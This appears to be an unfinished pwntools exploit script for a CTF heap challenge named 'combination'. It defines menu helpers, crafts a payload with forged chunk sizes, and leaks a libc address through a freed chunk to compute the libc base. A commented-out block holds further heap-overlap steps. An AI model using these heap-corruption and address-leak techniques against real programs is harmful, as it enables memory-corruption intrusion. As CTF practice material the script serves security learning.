from pwn13 import *

def alloc(size, data):
    print p.recvuntil("> ")
    p.sendline("1")
    print p.recvuntil("Enter size : ")
    p.sendline(str(size))
    print p.recvuntil("Enter data : ")
    p.sendline(str(data))

def free(idx):
    print p.recvuntil("> ")
    p.sendline("2")
    print p.recvuntil("Which one do you want to free : ")
    p.sendline(str(idx))


def modify(idx, data):
    print p.recvuntil("> ")
    p.sendline("4")
    print p.recvuntil(" : ")
    p.sendline(str(idx))
    print p.recvuntil(" : ")
    p.sendline(str(data))

def List(idx):
    print p.recvuntil("> ")
    p.sendline("3")
    print p.recvuntil("? ")
    p.sendline(str(idx))
    print p.recvuntil(" : ")
    data = p.recvline()[:-1]
    return data


p = process("./combination")
#p = remote("challenges.whitehatcontest.kr", 47850)

alloc(0x108,'a'*0x108)
p.getMappings()
payload = 'b'*(0x200-0x10) + p64(0x200) + p64(0x110)
alloc(0x200, payload)
#alloc(0x200, 'b'*0x200)
alloc(0x100,'c'*0x100)

#print '===='
#p.heap(0x0, 0x600)
#print '===='

free(2)
data = List(2)
print len(data)
print hex(u64(data+"\x00"*2))
libc_base = u64(data+"\x00"*2) - 3951480
print hex(libc_base)
p.interactive()


#print '===='
#p.heap(0x0, 0x600)
#print '===='

'''
modify(1, "A"*0x108)

#print '===='
#p.heap(0x0, 0x600)
#print '===='

alloc(0x100,'B'*0x100)

#print '===='
#p.heap(0x0, 0x600)
#print '===='

alloc(0x98,'C'*0x98)

print '===='
p.heap(0x0, 0x600)
print '===='

free(4)

print '===='
p.heap(0x0, 0x600)
print '===='

free(3)

print '===='
p.heap(0x0, 0x600)
print '===='

alloc(0x200, 'D'*0x200)

print '===='
p.heap(0x0, 0x600)
print '===='

#free(5)


p.interactive()
'''
p.close()
